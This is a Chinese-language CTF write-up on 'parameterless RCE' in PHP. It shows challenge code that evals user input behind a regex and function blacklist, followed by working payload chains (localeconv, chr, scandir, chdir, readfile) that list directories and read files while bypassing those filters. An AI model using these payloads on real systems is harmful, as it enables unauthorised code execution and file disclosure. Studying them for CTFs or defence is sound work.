# 关于CTF当中的无参数RCE

最近打了一场校内的比赛，又遇到了无参数RCE。

所以记录一下无参数rce的做法

## 什么是无参数

首先先看这个正则表达式`/[^\W]+\((?R)?\)/`

这个正则是对`()`的一个循环匹配，从传过来的参数当中进行匹配，匹配字母、数字、下划线，然后再匹配一个循环的`()`，将匹配的替换为空，判断剩下的是否只剩下`;`。

也就是说括号当中不能含有参数，这就是无参数。

## 例一：

```php
<?php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
} else {
    show_source(__FILE__);
}
?> 
```

这道题就是一道无参数RCE的题，只是没有对函数进行过滤

无参数的题最重要的就是如何构造出`.`

**localeconv()**

localeconv() 函数返回一包含本地数字及货币格式信息的数组，且第一个元素为点（.)。

![image-20210410180114692](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210410180114692.png)

**pos()**

pos() 函数返回数组中的当前元素的值（取第一个元素）。

![image-20210410180209879](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210410180209879.png)

这样就构造出`.`来了

**scandir()**

scandir() 函数返回指定目录中的文件和目录的数组。

![image-20210410180639310](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210410180639310.png)

这样就可以查看目录下的文件了

```
?code=var_dump(scandir(pos(localeconv())));
```

![image-20210410181254178](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210410181254178.png)

再利用end函数就可以将数组指针指向最后

![image-20210410181406631](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210410181406631.png)

**读取文件**

readfile — 输出文件

highlight_file — 语法高亮一个文件

show_source — 别名highlight_file()

file_get_contents — 将整个文件读入一个字符串

**readgzfile（）**可用于读取非gzip格式的文件。在这种情况下， **readgzfile（）**将直接从文件读取而不进行解压缩。

## 例二：

```php
<?php
if ($login && isset($_GET['code'])) {
    if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
        if (!preg_match('/highlight_file|localeconv|pos|curret|chdir|localtime|time|session|getallheaders|system|array|implode/i', $_GET['code'])) {
            eval($_GET['code']);
        } else {
            echo "含有危险函数" . "<br/>";
        }
    } else {
        echo "不符合正则表达式" . "<br/>";
    }
}
?>
```

这一题过滤掉了很多的函数

不能用`localeconv`来构造`.`了

**chr()**

chr() 函数从指定的 ASCII 值返回字符。

利用这个函数只要构造出`46`来就可以构造出`.`了

![image-20210410193718817](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210410193718817.png)

phpversion()会返回php版本，如`5.6.27`

```
floor(phpversion())`返回`5
sqrt(floor(phpversion()))`返回`2.2360679774998
tan(floor(sqrt(floor(phpversion()))))`返回`-2.1850398632615
cosh(tan(floor(sqrt(floor(phpversion())))))`返回`4.5017381103491
sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))`返回`45.081318677156
ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))`返回`46
```

即：`chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))`等于`.`

还有一个方法也可以构造出`.`来

```
chr(ord(hebrevc(crypt(phpversion()))))`返回`.
```

- `hebrevc(crypt(arg))`可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符

**crypt()**：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。

**hebrevc()**：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。

不过这个办法不是每一次都能构造出来

![image-20210410194214795](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210410194214795.png)

![image-20210410194224286](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210410194224286.png)

需要多试几次才行

## 其他构造方法

- 利用三角函数构造斜杠

```
chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))));
```

- 利用随机令牌构造点

```none
echo(implode(scandir(chr(strrev(uniqid())))));
```

- 利用当前秒数构造点

```
chr(pos(localtime()));
```

## 其他情况

如果文件不在数组的最后，而是在别的位置则可以利用这些函数

`array_rand()`-返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。

`array_reverse()`-以相反的元素顺序返回数组

`current() `- 返回数组中的当前元素的值

`end()`- 将内部指针指向数组中的最后一个元素，并输出

`next()`- 将内部指针指向数组中的下一个元素，并输出

`prev() `- 将内部指针指向数组中的上一个元素，并输出

`reset()` - 将内部指针指向数组中的第一个元素，并输出

`each() `- 返回当前元素的键名和键值，并将内部指针向前移动



- 假设flag在上层目录文件的情况，我们需要跳转到上层目录。
- `chdir()`函数当参数为两个点的时候能够跳转到上层目录。`scandir()`，读取当前目录在第二个元素就能读取两个点
- localtime第一个参数是时间戳，所以我们不能直接嵌套，需要带一个time函数作为嵌套、time函数能够返回时间戳
- 构造读取上层目录payload

```
echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));
```

- 构造读取上层目录文件payload

```
echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));
```

